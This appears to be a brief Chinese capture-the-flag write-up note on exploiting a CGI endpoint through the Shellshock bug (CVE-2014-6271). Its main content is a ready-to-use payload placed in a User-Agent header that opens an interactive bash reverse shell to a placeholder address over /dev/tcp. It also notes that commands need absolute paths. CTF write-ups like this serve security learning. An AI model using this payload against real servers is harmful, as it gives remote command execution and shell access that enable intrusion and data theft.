
## **CGI命令执行**
看 url ，cgi 的 rce：[CVE-2014-6271](https://www.cnblogs.com/qmfsun/p/7591757.html)，不知道为什么不能直接读 flag，但是可以弹 shell，执行命令需要绝对路径

```
payload： User-Agent: () { :;}; `/bin/bash -i &>/dev/tcp/x.x.x.x/2333 <&1` 
```

